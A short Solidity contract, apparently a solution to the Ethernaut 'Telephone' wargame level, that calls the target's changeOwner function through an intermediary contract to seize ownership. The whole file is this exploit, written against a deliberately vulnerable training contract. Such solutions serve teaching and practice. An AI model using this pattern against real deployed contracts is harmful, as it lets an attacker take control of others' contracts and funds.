// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./telephone.sol";

contract AttackTelephone{
    Telephone telephone;

    constructor(Telephone _telephone) public{
        telephone = Telephone(_telephone);
    }

    function attack(address _address) public{
        telephone.changeOwner(_address);
    }

}
